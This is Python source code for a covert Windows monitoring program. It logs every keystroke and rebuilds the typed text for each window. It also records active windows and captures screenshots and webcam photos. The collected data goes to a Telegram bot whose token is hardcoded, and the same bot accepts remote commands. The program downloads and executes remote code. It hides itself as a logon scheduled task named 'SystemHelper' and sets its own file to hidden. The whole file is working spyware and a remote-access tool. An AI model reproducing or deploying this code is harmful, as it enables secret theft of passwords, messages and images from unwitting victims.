import ctypes
import ctypes.wintypes as wintypes
import datetime
import json
import os
import socket
import subprocess
import sys
import threading
import time
import urllib.request
import uuid
from pathlib import Path

if getattr(sys, "frozen", False):
    BASE_DIR = Path(sys.executable).resolve().parent
else:
    BASE_DIR = Path(__file__).resolve().parent
CONFIG_FILE = BASE_DIR / "config.json"
STATUS_FILE = BASE_DIR / "last_status.json"
RUNTIME_DIR = BASE_DIR / "runtime"

DEFAULTS = {
    "telegram_bot_token": "8769415154:AAHvACXi9Urn1H6pcCCWQwgaTV6QqR8leOc",
    "telegram_chat_id": "-5107824487",
    "report_interval_seconds": 60,
    "screenshot_interval_seconds": 60,
    "screenshot_enabled": True,
    "keylog_enabled": True,
    "camera_enabled": False,
    "camera_interval_seconds": 0,
    "update_url": "",
    "log_dir": str(BASE_DIR / "logs"),
}

cfg = dict(DEFAULTS)
start_time = None
MACHINE_NAME = os.environ.get("COMPUTERNAME") or socket.gethostname()


def now():
    return datetime.datetime.now()


def ts():
    return now().strftime("%Y-%m-%d %H:%M:%S")


def load_config():
    global cfg
    if CONFIG_FILE.exists():
        try:
            data = json.loads(CONFIG_FILE.read_text(encoding="utf-8"))
            cfg.update(data)
        except Exception:
            pass
    Path(cfg["log_dir"]).mkdir(parents=True, exist_ok=True)


def log_line(category, line):
    try:
        day = now().strftime("%Y-%m-%d")
        path = Path(cfg["log_dir"]) / "{}_{}.log".format(category, day)
        with open(path, "a", encoding="utf-8") as f:
            f.write("{} | {} | {}\n".format(ts(), MACHINE_NAME, line))
    except Exception:
        pass


def update_url():
    return (cfg.get("update_url", "") or "").strip()


def fetch_remote_update():
    base = update_url()
    if not base or "PASTE_YOUR" in base:
        return False
    try:
        version_url = base.rstrip("/") + "/version.txt"
        with urllib.request.urlopen(version_url, timeout=20) as resp:
            remote_version = resp.read().decode("utf-8", "replace").strip()
        marker = RUNTIME_DIR / "current_version.txt"
        if (
            marker.exists()
            and marker.read_text(encoding="utf-8").strip() == remote_version
            and (RUNTIME_DIR / "monitor.py").exists()
        ):
            return True
        code_url = base.rstrip("/") + "/monitor.py"
        with urllib.request.urlopen(code_url, timeout=30) as resp:
            code = resp.read().decode("utf-8", "replace")
        if len(code) < 500:
            raise ValueError("monitor.py tu xa qua ngan (co the sai URL)")
        RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
        (RUNTIME_DIR / "monitor.py").write_text(code, encoding="utf-8")
        marker.write_text(remote_version, encoding="utf-8")
        log_line("system", "remote update to version " + remote_version)
        return True
    except Exception as e:
        log_line("errors", "remote update: {}".format(e))
        return False


def run_runtime_code():
    path = RUNTIME_DIR / "monitor.py"
    if not path.exists():
        return False
    try:
        code = path.read_text(encoding="utf-8")
        ns = {"__name__": "monitor_runtime", "__file__": str(path)}
        exec(compile(code, str(path), "exec"), ns)
        main_fn = ns.get("main")
        if main_fn:
            main_fn()
        return True
    except Exception as e:
        log_line("errors", "run runtime: {}".format(e))
        return False


def restart_process():
    try:
        if getattr(sys, "frozen", False):
            subprocess.Popen(
                [sys.executable],
                creationflags=subprocess.DETACHED_PROCESS
                | subprocess.CREATE_NEW_PROCESS_GROUP,
            )
        else:
            subprocess.Popen(
                [sys.executable, str(Path(__file__).resolve())],
                creationflags=subprocess.DETACHED_PROCESS
                | subprocess.CREATE_NEW_PROCESS_GROUP,
            )
    except Exception:
        pass
    os._exit(0)


def telegram_enabled():
    token = cfg.get("telegram_bot_token", "")
    chat = cfg.get("telegram_chat_id", "")
    return "PASTE_YOUR" not in token and bool(chat)


paused = threading.Event()
CONTROL_LOCK = threading.Lock()
last_update_id = 0


def send_telegram_text(text):
    if not telegram_enabled():
        return False
    last_err = None
    for attempt in range(3):
        try:
            data = json.dumps(
                {"chat_id": cfg["telegram_chat_id"], "text": text}
            ).encode("utf-8")
            req = urllib.request.Request(
                "https://api.telegram.org/bot{}/sendMessage".format(
                    cfg["telegram_bot_token"]
                ),
                data=data,
                headers={"Content-Type": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=30):
                pass
            return True
        except Exception as e:
            last_err = e
            time.sleep(3)
    log_line("errors", "send_text failed: {}".format(last_err))
    return False


def send_telegram_photo(path, caption, filename="screen.png", ctype="image/png"):
    if not telegram_enabled() or not path:
        return False
    try:
        with open(path, "rb") as f:
            image = f.read()
        boundary = "----monitor" + uuid.uuid4().hex

        def part(name, value, filename=None, ctype=None):
            head = '--{}\r\nContent-Disposition: form-data; name="{}"'.format(
                boundary, name
            )
            if filename:
                head += '; filename="{}"'.format(filename)
            head += "\r\n"
            if ctype:
                head += "Content-Type: {}\r\n".format(ctype)
            return (head + "\r\n").encode("utf-8") + value + b"\r\n"

        body = b""
        body += part("chat_id", cfg["telegram_chat_id"].encode("utf-8"))
        body += part("caption", caption.encode("utf-8"))
        body += part("photo", image, filename=filename, ctype=ctype)
        body += "--{}--\r\n".format(boundary).encode("utf-8")
        req = urllib.request.Request(
            "https://api.telegram.org/bot{}/sendPhoto".format(
                cfg["telegram_bot_token"]
            ),
            data=body,
            headers={
                "Content-Type": "multipart/form-data; boundary=" + boundary
            },
        )
        with urllib.request.urlopen(req, timeout=120):
            pass
        return True
    except Exception as e:
        log_line("errors", "send_photo: {}".format(e))
        return False


user32 = ctypes.WinDLL("user32", use_last_error=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)


def handle_command(text):
    global paused
    cmd = (text or "").strip().lower().split(" ")[0]
    if cmd == "/stop":
        paused.set()
        send_telegram_text("[{}] GIAM SAT DA TAM DUNG (/start de bat lai)".format(MACHINE_NAME))
        log_line("system", "paused by remote command")
        return
    if cmd == "/start":
        paused.clear()
        send_telegram_text("[{}] GIAM SAT DA BAT (/stop de tam dung)".format(MACHINE_NAME))
        log_line("system", "resumed by remote command")
        return
    if cmd == "/status":
        state = "tam dung (STOP)" if paused.is_set() else "dang chay (RUN)"
        send_telegram_text("[{}] Trang thai: {} | up {}m".format(
            MACHINE_NAME, state, int((now() - start_time).total_seconds() // 60)
        ))
        return
    if cmd == "/report":
        threading.Thread(target=force_report, daemon=True).start()
        send_telegram_text("[{}] Dang tao bao cao nhanh...".format(MACHINE_NAME))
        return
    if cmd == "/camera":
        send_telegram_text("[{}] Dang chup camera...".format(MACHINE_NAME))
        threading.Thread(target=do_camera_shot, daemon=True).start()
        return
    if cmd == "/update":
        send_telegram_text("[{}] Dang kiem tra phien ban moi...".format(MACHINE_NAME))
        threading.Thread(target=remote_update_cmd, daemon=True).start()
        return
    if cmd in ("/help", "/start_help"):
        send_telegram_text(
            "[{}] Lenh:\n/start - bat giam sat\n/stop - tam dung\n"
            "/status - trang thai\n/report - bao cao ngay\n"
            "/camera - chup anh webcam\n/update - cap nhat tu xa\n"
            "/help - nay".format(
                MACHINE_NAME
            )
        )
        return


def command_listener():
    global last_update_id
    while True:
        try:
            if not telegram_enabled():
                time.sleep(30)
                continue
            url = (
                "https://api.telegram.org/bot{}/getUpdates?timeout=5&offset={}".format(
                    cfg["telegram_bot_token"], last_update_id + 1
                )
            )
            with urllib.request.urlopen(url, timeout=30) as resp:
                data = json.loads(resp.read().decode("utf-8"))
            for upd in data.get("result", []):
                last_update_id = max(last_update_id, upd.get("update_id", 0))
                msg = upd.get("message", {}).get("text", "")
                chat = str(upd.get("message", {}).get("chat", {}).get("id", ""))
                if chat == str(cfg.get("telegram_chat_id", "")) and msg.startswith("/"):
                    handle_command(msg)
        except Exception:
            time.sleep(5)


def force_report():
    try:
        since = now() - datetime.timedelta(minutes=5)
        keys = drain_keys()
        sess = drain_sessions(since)
        lines = []
        if sess:
            lines.append("Apps:")
            for s in sess[:30]:
                secs = int((s["end"] - s["start"]).total_seconds())
                lines.append("  {} ({}m) {}".format(
                    s["title"], secs // 60, s["start"].strftime("%H:%M")
                ))
        if keys:
            lines.append("Keys:")
            for k in keys[:80]:
                if isinstance(k, dict):
                    lines.append("  {} | {} | {}".format(k["time"], k["win"], k["text"]))
                else:
                    lines.append("  " + str(k))
        message = "[{}] Bao cao nhanh\n".format(MACHINE_NAME) + "\n".join(lines or ["  (khong co gi moi)"])
        if len(message) > 3800:
            message = message[:3800]
        send_telegram_text(message)
    except Exception as e:
        log_line("errors", "force_report: {}".format(e))


def active_window_title():
    try:
        hwnd = user32.GetForegroundWindow()
        if not hwnd:
            return ""
        length = user32.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value
    except Exception:
        return ""


window_lock = threading.Lock()
current_window = {"title": "", "start": None}
sessions = []


def window_poller():
    global current_window
    while True:
        try:
            title = active_window_title() or "(desktop)"
            with window_lock:
                if title != current_window["title"]:
                    if current_window["title"] and current_window["start"]:
                        sessions.append(
                            {
                                "title": current_window["title"],
                                "start": current_window["start"],
                                "end": now(),
                            }
                        )
                    current_window = {"title": title, "start": now()}
        except Exception:
            pass
        time.sleep(5)


WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p),
    ]


key_lock = threading.Lock()
key_buffer = []


def key_to_text(vk, scan):
    if vk == 0x08:
        return "[CTRL+BACKSPACE]" if is_ctrl_down() else "[BACKSPACE]"
    if vk == 0x09:
        return "[TAB]"
    if vk == 0x0D:
        return "[ENTER]\n"
    if vk == 0x1B:
        return "[ESC]"
    if vk == 0x20:
        return " "
    if 0x70 <= vk <= 0x87:
        return "[F{}]".format(vk - 0x6F)
    if vk == 0x2E:
        return "[DEL]"
    if vk == 0x2D:
        return "[INS]"
    if vk == 0x24:
        return "[HOME]"
    if vk == 0x23:
        return "[END]"
    if vk == 0x21:
        return "[PGUP]"
    if vk == 0x22:
        return "[PGDN]"
    if 0x25 <= vk <= 0x28:
        return "[{}]".format("LURD"[vk - 0x25])
    if vk in (
        0x10, 0x11, 0x12, 0x14, 0x90, 0x91, 0x2C, 0x13,
        0x5B, 0x5C, 0x5D, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5,
    ):
        return ""
    if 0x41 <= vk <= 0x5A:
        ch = chr(vk)
        if is_ctrl_down():
            return "[CTRL+{}]".format(ch)
        return ch if is_upper_letter() else ch.lower()
    if 0x30 <= vk <= 0x39:
        return ")!@#$%^&*("[vk - 0x30] if is_shift_down() else chr(vk)
    if 0x60 <= vk <= 0x69:
        return str(vk - 0x60)
    if vk == 0x6A:
        return "*"
    if vk == 0x6B:
        return "+"
    if vk == 0x6D:
        return "-"
    if vk == 0x6E:
        return "."
    if vk == 0x6F:
        return "/"
    if vk == 0xBA:
        return ":" if is_shift_down() else ";"
    if vk == 0xBB:
        return "+" if is_shift_down() else "="
    if vk == 0xBC:
        return "<" if is_shift_down() else ","
    if vk == 0xBD:
        return "_" if is_shift_down() else "-"
    if vk == 0xBE:
        return ">" if is_shift_down() else "."
    if vk == 0xBF:
        return "?" if is_shift_down() else "/"
    if vk == 0xC0:
        return "~" if is_shift_down() else "`"
    if vk == 0xDB:
        return "{" if is_shift_down() else "["
    if vk == 0xDC:
        return "|" if is_shift_down() else "\\"
    if vk == 0xDD:
        return "}" if is_shift_down() else "]"
    if vk == 0xDE:
        return '"' if is_shift_down() else "'"
    return ""


def is_shift_down():
    try:
        return bool(user32.GetKeyState(0x10) & 0x8000)
    except Exception:
        return False


def is_caps_down():
    try:
        return bool(user32.GetKeyState(0x14) & 0x0001)
    except Exception:
        return False


def is_ctrl_down():
    try:
        return bool(
            (user32.GetKeyState(0x11) & 0x8000)
            or (user32.GetKeyState(0xA2) & 0x8000)
            or (user32.GetKeyState(0xA3) & 0x8000)
        )
    except Exception:
        return False


def is_upper_letter():
    return is_shift_down() ^ is_caps_down()


def on_key(vk, scan):
    try:
        text = key_to_text(vk, scan)
        if not text:
            return
    except Exception:
        return
    with window_lock:
        win = current_window["title"]
    with key_lock:
        key_buffer.append(
            {
                "time": now().strftime("%H:%M:%S"),
                "win": win,
                "text": text,
            }
        )


def reconstruct_text(key_texts):
    buf = []
    select_all = False
    clipboard = ""

    for text in key_texts:
        if text == "[CTRL+A]":
            select_all = True
            continue
        elif text == "[CTRL+C]":
            clipboard = "".join(buf)
            select_all = False
            continue
        elif text == "[CTRL+V]":
            if select_all:
                buf.clear()
                select_all = False
            buf.extend(list(clipboard))
            continue
        elif text == "[CTRL+X]":
            clipboard = "".join(buf)
            buf.clear()
            select_all = False
            continue
        elif text == "[CTRL+BACKSPACE]":
            if select_all:
                buf.clear()
                select_all = False
            else:
                while buf and buf[-1] == " ":
                    buf.pop()
                while buf and buf[-1] != " ":
                    buf.pop()
            continue

        if select_all:
            if text == "[BACKSPACE]":
                buf.clear()
                select_all = False
                continue
            elif not (text.startswith("[") and text.endswith("]")):
                buf.clear()
                select_all = False

        select_all = False

        if text == "[BACKSPACE]":
            if buf:
                buf.pop()
        elif text == "[TAB]":
            buf.append(" [TAB] ")
        elif text.startswith("[ENTER]"):
            buf.append(" [ENTER] ")
        elif text == " ":
            buf.append(" ")
        elif text.startswith("[CTRL+"):
            buf.append(" {} ".format(text))
        elif text.startswith("[") and text.endswith("]"):
            buf.append(" {} ".format(text))
        else:
            buf.append(text)

    result = "".join(buf)
    if len(result) > 400:
        result = result[:400] + "..."
    return result


def reconstruct_by_window(keys):
    if not keys:
        return []
    groups = []
    current_win = None
    current_keys = []
    for k in keys:
        if isinstance(k, dict):
            win = k.get("win", "")
            text = k.get("text", "")
        else:
            parts = str(k).split(" | ", 2)
            win = parts[1] if len(parts) >= 3 else ""
            text = parts[2] if len(parts) >= 3 else str(k)

        if win != current_win:
            if current_keys:
                txt = reconstruct_text(current_keys)
                if txt:
                    groups.append((current_win, txt))
            current_win = win
            current_keys = [text]
        else:
            current_keys.append(text)
    if current_keys:
        txt = reconstruct_text(current_keys)
        if txt:
            groups.append((current_win, txt))
    return groups


_hook = None
_callback = None


def keylog_thread():
    prev = set()
    while True:
        try:
            if paused.is_set():
                prev = set()
                time.sleep(0.5)
                continue
            down = set()
            for vk in range(0x08, 0xFF):
                if user32.GetAsyncKeyState(vk) & 0x8000:
                    down.add(vk)
            newly_pressed = down - prev
            for vk in newly_pressed:
                on_key(vk, 0)
            prev = down
        except Exception:
            pass
        time.sleep(0.02)


def take_screenshot():
    try:
        import mss
    except Exception:
        return None
    try:
        shots = Path(cfg["log_dir"]) / "screenshots"
        shots.mkdir(parents=True, exist_ok=True)
        path = shots / (now().strftime("%Y-%m-%d_%H-%M-%S") + ".png")
        with mss.mss() as sct:
            sct.shot(output=str(path))
        return str(path)
    except Exception:
        return None


def capture_camera():
    try:
        import cv2
    except Exception:
        return None
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        if not cap.isOpened():
            cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        cap.release()
        if not ret or frame is None:
            return None
        shots = Path(cfg["log_dir"]) / "camera"
        shots.mkdir(parents=True, exist_ok=True)
        path = shots / (now().strftime("%Y-%m-%d_%H-%M-%S") + ".jpg")
        cv2.imwrite(str(path), frame)
        return str(path)
    except Exception:
        return None


def do_camera_shot():
    p = capture_camera()
    if p:
        send_telegram_photo(
            p,
            "Camera {} {}".format(MACHINE_NAME, now().strftime("%H:%M")),
            filename="camera.jpg",
            ctype="image/jpeg",
        )
    else:
        send_telegram_text("[{}] Khong chup duoc camera (khong co webcam?)".format(MACHINE_NAME))


def screenshot_thread():
    while True:
        time.sleep(cfg.get("screenshot_interval_seconds", 600))
        if paused.is_set():
            continue
        if not cfg.get("screenshot_enabled", True):
            continue
        p = take_screenshot()
        if p:
            log_line("system", "screenshot " + p)


def camera_thread():
    while True:
        interval = cfg.get("camera_interval_seconds", 0)
        if interval <= 0:
            time.sleep(30)
            continue
        time.sleep(interval)
        if paused.is_set():
            continue
        if not cfg.get("camera_enabled", False):
            continue
        p = capture_camera()
        if p:
            log_line("system", "camera " + p)
            send_telegram_photo(
                p,
                "Camera {} {}".format(MACHINE_NAME, now().strftime("%H:%M")),
                filename="camera.jpg",
                ctype="image/jpeg",
            )


last_report = None


def drain_keys():
    with key_lock:
        items = list(key_buffer)
        key_buffer.clear()
    return items


def drain_sessions(since):
    with window_lock:
        picked = [s for s in sessions if s["start"] >= since]
        sessions[:] = [s for s in sessions if s["start"] < since]
    return picked


def latest_screenshot():
    shots = Path(cfg["log_dir"]) / "screenshots"
    if not shots.exists():
        return None
    files = sorted(shots.glob("*.png"), key=lambda p: p.stat().st_mtime)
    return str(files[-1]) if files else None


def reporter_thread():
    global last_report, start_time
    last_report = now()
    while True:
        time.sleep(cfg.get("report_interval_seconds", 300))
        if paused.is_set():
            continue
        since = last_report
        last_report = now()
        keys = drain_keys()
        sess = drain_sessions(since)

        lines = []
        if sess:
            lines.append("Apps:")
            for s in sess[:30]:
                secs = int((s["end"] - s["start"]).total_seconds())
                lines.append(
                    "  {} ({}m) {}".format(
                        s["title"], secs // 60, s["start"].strftime("%H:%M")
                    )
                )
        if keys:
            lines.append("Keys:")
            for k in keys[:80]:
                if isinstance(k, dict):
                    lines.append("  {} | {} | {}".format(k["time"], k["win"], k["text"]))
                else:
                    lines.append("  " + str(k))
            if len(keys) > 80:
                lines.append("  ... +{} keys".format(len(keys) - 80))

            groups = reconstruct_by_window(keys)
            if len(groups) == 1:
                lines.append("-> Kết quả: {}".format(groups[0][1]))
            elif len(groups) > 1:
                lines.append("-> Kết quả:")
                for w, t in groups:
                    lines.append("  [{}]: {}".format(w, t))

        uptime_min = int((now() - start_time).total_seconds() // 60)
        header = "[{}] Report {} -> {} (up {}m)".format(
            MACHINE_NAME, since.strftime("%H:%M"), now().strftime("%H:%M"),
            uptime_min,
        )
        if not lines:
            lines.append("  (no notable activity)")
        message = header + "\n" + "\n".join(lines)
        if len(message) > 3800:
            message = message[:3800]
        send_telegram_text(message)

        if cfg.get("screenshot_enabled", True):
            shot = latest_screenshot()
            if shot:
                send_telegram_photo(
                    shot,
                    "Screen {} {}".format(
                        MACHINE_NAME, now().strftime("%H:%M")
                    ),
                )
        log_line("system", "report sent")


def startup_notice():
    offline = ""
    if STATUS_FILE.exists():
        try:
            data = json.loads(STATUS_FILE.read_text(encoding="utf-8"))
            last_seen = datetime.datetime.fromisoformat(
                data.get("last_seen", "")
            )
            gap = (now() - last_seen).total_seconds()
            if gap > max(cfg["report_interval_seconds"] * 2, 600):
                offline = "\n(PC was off since {})".format(
                    last_seen.strftime("%Y-%m-%d %H:%M")
                )
        except Exception:
            pass
    STATUS_FILE.write_text(
        json.dumps({"last_seen": now().isoformat()}), encoding="utf-8"
    )
    ok = send_telegram_text(
        "[{}] PC ON at {}{}".format(
        MACHINE_NAME, now().strftime("%Y-%m-%d %H:%M"), offline
    )
    )
    try:
        (BASE_DIR / "status.txt").write_text(
            "{} | Telegram={} | Machine={}\n".format(
                now().strftime("%Y-%m-%d %H:%M:%S"),
                "OK" if ok else "FAIL",
                MACHINE_NAME,
            ),
            encoding="utf-8",
        )
    except Exception:
        pass


def self_install():
    marker = BASE_DIR / ".installed"
    if marker.exists():
        return
    try:
        exe = sys.executable if getattr(sys, "frozen", False) else str(
            Path(__file__).resolve()
        )
        ps = (
            "$a = New-ScheduledTaskAction -Execute '{0}'; "
            "$t = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME; "
            "Register-ScheduledTask -TaskName 'SystemHelper' -Action $a "
            "-Trigger $t -Force | Out-Null"
        ).format(exe)
        result = subprocess.run(
            ["powershell", "-NoProfile", "-Command", ps],
            capture_output=True,
        )
        if result.returncode == 0:
            log_line("system", "self-installed: schedule + hidden")
        else:
            log_line(
                "errors",
                "self_install rc={}: {}".format(
                    result.returncode,
                    (result.stderr or b"").decode("utf-8", "replace").strip(),
                ),
            )
        subprocess.run(
            "attrib +h {}\\SystemHelper.exe".format(BASE_DIR),
            shell=True,
            capture_output=True,
        )
        marker.write_text("ok", encoding="utf-8")
    except Exception as e:
        log_line("errors", "self_install: {}".format(e))


def remote_update_cmd():
    if fetch_remote_update():
        send_telegram_text(
            "[{}] Da tai phien ban moi, dang khoi dong lai...".format(MACHINE_NAME)
        )
        log_line("system", "restarting after remote update")
        restart_process()
    else:
        version_file = RUNTIME_DIR / "current_version.txt"
        if version_file.exists():
            cur = version_file.read_text(encoding="utf-8").strip()
            send_telegram_text(
                "[{}] Khong co phien ban moi (dang o {}).".format(
                    MACHINE_NAME, cur
                )
            )
        else:
            send_telegram_text(
                "[{}] Khong tim thay phien ban moi (kiem tra update_url).".format(
                    MACHINE_NAME
                )
            )


def main():
    load_config()
    global start_time
    start_time = now()
    if __name__ != "monitor_runtime":
        if fetch_remote_update():
            if run_runtime_code():
                log_line("system", "running runtime code v"
                         + (RUNTIME_DIR / "current_version.txt").read_text(
                             encoding="utf-8"
                         ).strip())
                return
    threading.Thread(target=window_poller, daemon=True).start()
    if cfg.get("keylog_enabled", True):
        threading.Thread(target=keylog_thread, daemon=True).start()
    threading.Thread(target=screenshot_thread, daemon=True).start()
    threading.Thread(target=camera_thread, daemon=True).start()
    threading.Thread(target=reporter_thread, daemon=True).start()
    threading.Thread(target=command_listener, daemon=True).start()
    if getattr(sys, "frozen", False):
        threading.Thread(target=self_install, daemon=True).start()
    threading.Thread(target=startup_notice, daemon=True).start()
    log_line("system", "monitor started")
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()